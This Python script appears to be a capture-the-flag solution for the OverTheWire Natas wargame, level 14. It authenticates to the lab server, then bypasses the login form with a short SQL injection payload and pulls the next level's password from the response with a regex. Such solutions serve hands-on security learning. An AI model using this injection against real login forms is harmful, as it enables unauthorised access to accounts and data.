import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, password, proxies=None):
    print("[+] Logging in as natas14...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = requests.get(url, auth=(user, password), proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)
    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)

# Function to extract the password from the response
def getpass(url, user, password, proxies=None):
    print("[+] Bypassing login form with sql injection...")
    time.sleep(1)
    payload = '"--'
    login = {'username':payload, 'password':'"'}

    response = requests.post(url, auth=(user, password), data=login, proxies=proxies)
    content = response.text
    
    print(f"[+] Getting the password...")
    time.sleep(1)

    # Define regex pattern to find the password
    pattern = r'([A-Za-z0-9]{32})'
    # Using regex to search for password and extract it.
    passwd = (re.findall(pattern, content))
    print(f"[+] The password of natas15 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas15 by exploiting a sql injection in a login form.")
    parser.add_argument('-p', '--password', help='Password of Natas14.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas14'
    url = f'http://{user}.natas.labs.overthewire.org'
    password = args.password
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, password, proxies=proxies)
        getpass(url, user, password, proxies=proxies)

    else:
        login(url, user, password)
        getpass(url, user, password)
    
if __name__ == "__main__":
    main()